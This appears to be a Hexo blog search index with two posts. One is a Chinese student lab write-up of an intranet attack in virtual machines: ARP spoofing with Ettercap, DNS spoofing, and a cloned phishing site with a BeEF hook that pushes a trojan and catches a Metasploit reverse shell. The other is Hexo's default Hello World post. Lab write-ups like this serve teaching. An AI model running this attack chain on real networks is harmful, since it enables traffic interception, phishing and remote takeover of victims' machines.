<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)</title>
    <link href="/2021/09/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(arp%E6%AC%BA%E9%AA%97%20+%20DNS%E6%AC%BA%E9%AA%97%20+%20%E7%BD%91%E7%AB%99%E9%92%93%E9%B1%BC)/"/>
    <url>/2021/09/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(arp%E6%AC%BA%E9%AA%97%20+%20DNS%E6%AC%BA%E9%AA%97%20+%20%E7%BD%91%E7%AB%99%E9%92%93%E9%B1%BC)/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透-arp欺骗-DNS欺骗-网站钓鱼"><a href="#内网渗透-arp欺骗-DNS欺骗-网站钓鱼" class="headerlink" title="内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)"></a>内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)</h1><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>以下皆在虚拟机环境中进行测试（学校实验报告要求），严禁对外使用。<br><font color=#999AAA >攻击机kali：192.168.241.140<br>目标机win7：192.168.241.136<br>网关：192.168.241.2<br></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、ARP数据流截取"><a href="#一、ARP数据流截取" class="headerlink" title="一、ARP数据流截取"></a>一、ARP数据流截取</h1><p>1、打开Ettercap GUI界面<br><img src="https://img-blog.csdnimg.cn/cbe703f2913a41e78e7bd454a6099f88.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_15,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>以上述状态，点击右上角勾勾<br><img src="https://img-blog.csdnimg.cn/f52ea82c37564972b16ef9fe8ba11529.png" alt="请添加图片描述"><br>先左上角寻找网段内存活主机，并且把网关ip增加到target1，把目标机ip增加到target2上，然后选择右上星球图标，点击ARP poisoning，勾选sniff remote connections然后OK，开始攻击。</p><p>2.攻击</p><p>打开win7的cmd，查询arp地址表，发现攻击机物理地址与网关物理地址相同<br><img src="https://img-blog.csdnimg.cn/40c9301a0a8b408697fd46c5af39b301.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>说明arp欺骗成功<br>回到kali，执行driftnet -i eth0命令抓取截图<br>结果还算成功<br><img src="https://img-blog.csdnimg.cn/15300fdfd5174f90afe87ab408583405.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/34fa0b0e9def4ce9bfadb3aca80281c8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h1><p>首先修改Ettercap的dns配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">vim /etc/ettercap/etter.dns<br></code></pre></td></tr></table></figure><p>在19行增加一下内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*.*.com   A   <span class="hljs-number">192.168</span>.<span class="hljs-number">241.140</span>  （自己的主机ip地址）<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/72a660714e6c44dfbbe7d42d187789c4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>当目标机想要访问外网地址时，必先经过网关，于是只要在网关伪造dns地址就能欺骗其目标机，给Ettercap增加插件，如图依次plugins、manage plugins、dns_spoof(前面有个*号就是在使用中了)<br><img src="https://img-blog.csdnimg.cn/5858e616470947ed8a92de616a9d4888.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>用目标机win7对百度进行ping通信，可以发现回显的是攻击机ip（百度ip应为163.177.151.109）<br><img src="https://img-blog.csdnimg.cn/984c5eebf60f44af928b82c62c252049.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="三、网站钓鱼"><a href="#三、网站钓鱼" class="headerlink" title="三、网站钓鱼"></a>三、网站钓鱼</h1><p>实验准备：beef、社会工程学工具包、msf、木马制作<br>安装apache: apt-get install apache<br>木马制作（并且存到网站根目录下）：<br><img src="https://img-blog.csdnimg.cn/381f37aeabbc41a2a82113f7087a3857.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>一、创建一个钓鱼网站<br>运用社会工程学工具包克隆一个被大众接受的网站，比如baidu.com<br>命令如下：<br>setoolkit<br>1)(社会工程学攻击)<br>  2)(web站点攻击模式)<br>    7)(HTA攻击方法)<br>       2)(网站克隆)<br>跟着数字选就行，直至这个页面：<br><img src="https://img-blog.csdnimg.cn/5b56f7657f8f4bf58f4c97b0606972c3.png#pic_center" alt="在这里插入图片描述"><br>输入要克隆的网站，这里选择输入baidu.com<br>然后就能关了这工具（其实接下来只靠社会工程学包是可以制定攻击的，但我试了好多次都不会返回shell，之后我再试试）<br>只要访问自己的ip，能够显示克隆地百度页面，就算成功了<br>二、筹划攻击<br>msf：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">241.140</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT <span class="hljs-number">4444</span><br>exploit(multi/handler) &gt; exploit<br></code></pre></td></tr></table></figure><p>暂时放他监听就行…<br>beef:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> /usr/share/beef<span class="hljs-literal">-xss</span><br>./beef<br></code></pre></td></tr></table></figure><p>最新版不能用默认账号密码登录，所以要在配置里改账号和密码,在/etc/beef-xss/config.yaml<br>成功运行后：<br><img src="https://img-blog.csdnimg.cn/6c592072f45f49ae857b4dafe811a387.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>把图中 <a href="http://192.168.241.140:3000/hook.js%E5%A4%8D%E5%88%B6%E5%88%B0/var/www/html/index.html%E4%B8%AD">http://192.168.241.140:3000/hook.js复制到/var/www/html/index.html中</a><br>写法如下（最后一行）：<br><img src="https://img-blog.csdnimg.cn/2091e1083e514660baf43745bc39ef5a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>在这之后，我们用浏览器打开  <a href="http://192.168.241.140:3000/ui/panel">http://192.168.241.140:3000/ui/panel</a><br>登录beef，由于之前的dns欺骗，目标一旦访问带.com结尾的网站，就会重定向到我们的钓鱼网站，这里假设目标访问了<a href="http://www.baidu.com，那么beef就会回应我们：">www.baidu.com，那么beef就会回应我们：</a><br><img src="https://img-blog.csdnimg.cn/783acd8b1082450f952b498ba1ab9ea9.png#pic_center" alt="在这里插入图片描述"><br>可以看到目标机已经出现（192.168.241.136）浏览器用的是ie8,接下来对他进行文件欺骗<br><img src="https://img-blog.csdnimg.cn/73e91cad699f4ce296f7ee9892108877.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>这里有两个下载提示，一个是我用beef伪造给用户并且不会被浏览器拦截的文件(没错，这个就是我们开头做的木马)，一个是社会工程学工具包HTA攻击伪造的文件，会被拦截，而且后面无法反弹shell（试了n次）。<br><img src="https://img-blog.csdnimg.cn/6c7f1c85f393471abecf1ac2890e9483.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>运用beef功能，给目标一个提示，忽哟目标下载运行，<br>一旦目标运行，msf就会收到反弹回来shell连接<br><img src="https://img-blog.csdnimg.cn/9e078ae6303d4b718c1137bc7ca1fa2c.png#pic_center" alt="在这里插入图片描述"><br>直接输入shell，在看ip，正是目标机：<br><img src="https://img-blog.csdnimg.cn/b5210f39ce8645fabe366519a1e8e0d7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>接下来就是提权了</p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >同个局域网内，首先进行主机发掘，选定目标对其进行arp欺骗，然后对其流量分析，想尽办法与目标主机交互，在发现没有正面攻击手段时，可以选择DNS欺骗，对目标外出流量进行拦截和欺骗，想方设法使其访问我们的钓鱼网站或下载木马文件，绕过浏览器拦截极其重要。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/09/18/hello-world/"/>
    <url>/2021/09/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
